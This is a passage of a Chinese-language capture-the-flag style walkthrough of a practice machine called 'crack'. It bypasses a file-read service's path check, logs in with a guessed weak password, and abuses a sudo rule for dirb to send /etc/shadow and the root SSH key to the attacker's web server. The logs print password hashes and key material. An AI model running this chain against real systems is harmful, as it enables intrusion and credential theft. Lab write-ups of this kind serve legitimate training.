150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp&gt; mget crack.py
mget crack.py [anpqy?]? y
229 Entering Extended Passive Mode (|||35830|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |*****************************************************************************************|   849        1.71 MiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (799.51 KiB/s)
ftp&gt; exit
221 Goodbye.
                                                                                                                                    
┌──(kali㉿kali)-[~/test]
└─$ cat crack.py  
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = 'NO'
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = '/srv/ftp/upload/'+filename
                if os.path.isfile(check) and os.path.isfile(file):
                        f = open(file,'r')
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass

```

发现了`12359`端口的运行脚本，脚本实现文件读取服务。我们上去看看

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc 192.168.205.143 12359                       
File to read:/etc/passwd
NOFile to read:crack.py
['import os\n', 'import socket\n', 's = socket.socket()\n', 's.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n', 'port = 12359\n', 's.bind(('', port))\n', 's.listen(50)\n', '\n', 'c, addr = s.accept()\n', 'no = 'NO'\n', 'while True:\n', '        try:\n', '                c.send('File to read:'.encode())\n', '                data = c.recv(1024)\n', '                file = (str(data, 'utf-8').strip())\n', '                filename = os.path.basename(file)\n', '                check = '/srv/ftp/upload/'+filename\n', '                if os.path.isfile(check) and os.path.isfile(file):\n', '                        f = open(file,'r')\n', '                        lines = f.readlines()\n', '                        lines = str(lines)\n', '                        lines = lines.encode()\n', '                        c.send(lines)\n', '                else:\n', '                        c.send(no.encode())\n', '        except ConnectionResetError:\n', '                pass\n']
```

经过尝试可以发现只可以查看存在的文件，但是根据源码我们可以看出，他只是判断了`/srv/ftp/upload/` 中是否存在这个文件，如果存在就会查询，我们可以上传一个我们感兴趣的重名文件去试图读取

```bash
┌──(kali㉿kali)-[~/test]
└─$ ftp 192.168.205.143
Connected to 192.168.205.143.
220 (vsFTPd 3.0.3)
Name (192.168.205.143:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls
229 Entering Extended Passive Mode (|||19129|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp&gt; cd upload
250 Directory successfully changed.
ftp&gt; ls
229 Entering Extended Passive Mode (|||41641|)
150 Here comes the directory listing.
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp&gt; put passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||16042|)
150 Ok to send data.
100% |*****************************************************************************************|     4        0.20 KiB/s    00:00 ETA
226 Transfer complete.
4 bytes sent in 00:00 (0.19 KiB/s)
ftp&gt; put id_rsa 
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||42637|)
150 Ok to send data.
100% |*****************************************************************************************|  2656      135.55 KiB/s    00:00 ETA
226 Transfer complete.
2656 bytes sent in 00:00 (129.95 KiB/s)

```

利用一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc 192.168.205.143 12359
File to read:/etc/passwd
['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']
┌──(kali㉿kali)-[~/test]
└─$ echo 'root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n' |grep bash
root:x:0:0:root:/root:/bin/bash
, cris:x:1000:1000:cris,,,:/home/cris:/bin/bash

```

存在`cris`用户，我们尝试读取私钥

```bash
File to read:/home/cris/.ssh/id_rsa
NO
```

没有或者没有权限，那我们去看看其他端口

```bash
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.205.143:4200/
curl: (52) Empty reply from server

```

空连接，我去......

等会`12359`端口是文件读取，`21`是辅助，那远程连接端口在哪？

```bash
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS --min-rate 10000 -p4200 -Pn -sV 192.168.205.143
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-23 16:08 CST
Nmap scan report for 192.168.205.143
Host is up (0.00034s latency).

PORT     STATE SERVICE  VERSION
4200/tcp open  ssl/http ShellInABox
MAC Address: 08:00:27:75:33:75 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.53 seconds

```

原来是需要**https**连接

![Image](https://github.com/user-attachments/assets/35c088b0-7083-4f33-b462-c86838925382)

尝试一下弱密码(cris：cris)

![Image](https://github.com/user-attachments/assets/5d244afd-f3a0-47cf-ac95-b516cc8734f3)

猜对咯

# 3.提权

```bash
cris@crack:~$ sudo -l                                                                                                                                                                        
Matching Defaults entries for cris on crack:                                                                                                                                                 
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin                                                                                   
                                                                                                                                                                                             
User cris may run the following commands on crack:                                                                                                                                           
    (ALL) NOPASSWD: /usr/bin/dirb                                                                                                                                                            
cris@crack:~$ ls                                                                                                                                                                             
crack.py  user.txt  ziempre.py
cris@crack:~$ cat ziempre.py                                                                                                                                                                 
#!/usr/local/lib/python3.7                                                                                                                                                                     
from subprocess import Popen                                                                                                                                                                 
import sys                                                                                                                                                                                   
program = '/home/cris/crack.py'                                                                                                                                                              
while True:                                                                                                                                                                                  
    p = Popen('python3 '+program, shell=True)                                                                                                                                                
    p.wait()                                                                                                                                                                                 
                                                                                                                                       
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /etc/shadow                                                                                                                          
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:12:22 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /etc/shadow                                                                                                                                                                  
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 28
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:12:22 2025                                                                                                                                                           
DOWNLOADED: 28 - FOUND: 0                                                                                                                                                                    
```

接收一下

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /randomfile1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /frand2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /root:$y$j9T$LVT9GIrLdk5L.xns1akJZ1$wmigJ7er07AT/VwIAuYSZ3j94LOCe8EJHC6d2mlZVo3:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /daemon:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /bin:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sys:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sync:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /games:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /man:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /lp:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /mail:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /news:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /uucp:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /proxy:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /www-data:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /backup:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /list:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /irc:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /gnats:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /nobody:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /_apt:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-network:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-resolve:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /messagebus:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-timesync:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /sshd:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /cris:$y$j9T$kFXVxpRhH2ZAeDGNazqRq/$IokBR4XhhyRJOur8YOHu3fF59/0NOHC5AIsvkxXx8..:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /systemd-coredump:!*:19515:::::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /shellinabox:*:19515:0:99999:7::: HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:13:10] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:13:10] 'GET /ftp:*:19515:0:99999:7::: HTTP/1.1' 404 -

```

我去这么狠，自定义加密算法。测试读取`.bash_history`

```bash
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /root/.bash_history                                                                                                                  
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:16:41 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /root/.bash_history                                                                                                                                                          
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 0
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:16:41 2025                                                                                                                                                           
DOWNLOADED: 0 - FOUND: 0                                                                                                                                                                     
```

再试试`id_rsa`

```bash
cris@crack:~$ sudo /usr/bin/dirb http://192.168.205.141 /root/.ssh/id_rsa                                                                                                                    
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                            
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
START_TIME: Thu Jan 23 09:19:00 2025                                                                                                                                                         
URL_BASE: http://192.168.205.141/                                                                                                                                                            
WORDLIST_FILES: /root/.ssh/id_rsa                                                                                                                                                            
                                                                                                                                                                                             
-----------------                                                                                                                                                                            
                                                                                                                                                                                             
GENERATED WORDS: 38
                                                                                                                                                                                             
---- Scanning URL: http://192.168.205.141/ ----                                                                                                                                              


-----------------                                                                                                                                                                            
END_TIME: Thu Jan 23 09:19:00 2025                                                                                                                                                           
DOWNLOADED: 38 - FOUND: 0                                                                                                                                                                    
```

接收

```bash
┌──(kali㉿kali)-[~/test]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /randomfile1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /frand2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /-----BEGIN HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /NhAAAAAwEAAQAAAYEAxBvRe3EH67y9jIt2rwa79tvPDwmb2WmYv8czPn4bgSCpFmhDyHwn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b0IUyyw3iPQ3LlTYyz7qEc2vaj1xqlDgtafvvtJ2EJAJCFy5osyaqbYKgAkGkQMzOevdGt HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /xNQ8NxRO4/bC1v90lUrhyLi/ML5B4nak+5vLFJi8NlwXMQJ/xCWZg5+WOLduFp4VvHlwAf HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /tDh2C+tJp2hqusW1jZRqSXspCfKLPt/v7utpDTKtofxFvSS55MFciju4dIaZLZUmiqoD4k HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //+FwJbMna8iPwmvK6n/2bOsE1+nyKbkbvDG5pjQ3VBtK23BVnlxU4frFrbicU+VtkClfMu HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /yp7muWGA1ydvYUruoOiaURYupzuxw25Rao0Sb8nW1qDBYH3BETPCypezQXE22ZYAj0ThSl HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Kn2aZN/8xWAB+/t96TcXogtSbQw/eyp9ecmXUpq5i1kBbFyJhAJs7x37WM3/Cb34a/6v8c HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /9rMjGl9HMZFDwswzAGrvPOeroVB/TpZ+UBNGE1znAAAFgC5UADIuVAAyAAAAB3NzaC1yc2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /EAAAGBAMQb0XtxB+u8vYyLdq8Gu/bbzw8Jm9lpmL/HMz5+G4EgqRZoQ8h8J29CFMssN4j0 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Ny5U2Ms+6hHNr2o9capQ4LWn777SdhCQCQhcuaLMmqm2CoAJBpEDMznr3RrcTUPDcUTuP2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wtb/dJVK4ci4vzC+QeJ2pPubyxSYvDZcFzECf8QlmYOflji3bhaeFbx5cAH7Q4dgvrSado HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /arrFtY2Uakl7KQnyiz7f7+7raQ0yraH8Rb0kueTBXIo7uHSGmS2VJoqqA+JP/hcCWzJ2vI HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /j8Jryup/9mzrBNfp8im5G7wxuaY0N1QbSttwVZ5cVOH6xa24nFPlbZApXzLsqe5rlhgNcn HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /b2FK7qDomlEWLqc7scNuUWqNEm/J1tagwWB9wREzwsqXs0FxNtmWAI9E4UpSp9mmTf/MVg HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Afv7fek3F6ILUm0MP3sqfXnJl1KauYtZAWxciYQCbO8d+1jN/wm9+Gv+r/HPazIxpfRzGR HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Q8LMMwBq7zznq6FQf06WflATRhNc5wAAAAMBAAEAAAGAeX9uopbdvGx71wZUqo12iLOYLg HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /3a87DbhP2KPw5sRe0RNSO10xEwcVq0fUfQxFXhlh/VDN7Wr98J7b1RnZ5sCb+Y5lWH9iz2 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /m6qvDDDNJZX2HWr6GX+tDhaWLt0MNY5xr64XtxLTipZxE0n2Hueel18jNldckI4aLbAKa/ HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /a4rL058j5AtMS6lBWFvqxZFLFr8wEECdBlGoWzkjGJkMTBsPLP8yzEnlipUxGgTR/3uSMN HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /peiKDzLI/Y+QcQku/7GmUIV4ugP0fjMnz/XcXqe6GVNX/gvNeT6WfKPCzcaXiF4I2i228u HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TB9Ga5PNU2nYzJAQcAVvDwwC4IiNsDTdQY+cSOJ0KCcs2cq59EaOoZHY6Od88900V3MKFG HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /TwielzW1Nqq1ltaQYMtnILxzEeXJFp6LlqFTF4Phf/yUyK04a6mhFg3kJzsxE+iDOVH28D HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Unj2OgO53KJ2FdLBHkUDlXMaDsISuizi0aj2MnhCryfHefhIsi1JdFyMhVuXCzNGUBAAAA HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /wQDlr9NWE6q1BovNNobebvw44NdBRQE/1nesegFqlVdtKM61gHYWJotvLV79rjjRfjnGHo HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0MoSXZXiC/0/CSfe6Je7unnIzhiA85jSe/u2dIviqItTc2CBRtOZl7Vrflt7lasT7J1WAO HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /1ROwaN5uL26gIgtf/Y7Rhi0wFPN289UI2gjeVQKhXBObVm3qY7yZh8JpLPH5w0Xeuo20sP HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /WchZl0D8KSZUKhlPU6Pibqmj9bAAm7hwFecuQMeS+nxg1qIGYAAADBAOZ1XurOyyH9RWIo HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /0sTQ3d/kJNgTNHAs4Y0SxSOejC+N3tEU33GU3P+ppfHYy595rX7MX4o3gqXFpAaHRIAupr HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /DbenB1HQW4o6Gg+SF2GWPAQeuDbCsLM9P8XOiQIjTuCvYwHUdFD7nWMJ5Sqr6EeBV+CYw1 HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /Tg5PIU3FsnN5D3QOHVpGNo2qAvi+4CD0BC5fxOs6cZ1RBqbJ1kanw1H6fF8nRRBds+26Bl HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET //RGZHTBPLVenhNmWN2fje3GDBqVeIbZwAAAMEA2dfdjpefYEgtF0GMC9Sf5UzKIEKQMzoh HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /oxY6YRERurpcyYuSa/rxIP2uxu1yjIIcO4hpsQaoipTM0T9PS56CrO+FN9mcIcXCj5SVEq HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /2UVzu9LS0PdqPmniNmWglwvAbkktcEmbmCLYoh5GBxm9VhcL69dhzMdVe73Z9QhNXnMDlf HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
192.168.205.143 - - [23/Jan/2025 16:19:48] 'GET /6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+tGPXoqXIKrf5lVrVtFC HTTP/1.1' 404 -
192.168.205.143 - - [23/Jan/2025 16:19:48] code 404, message File not found
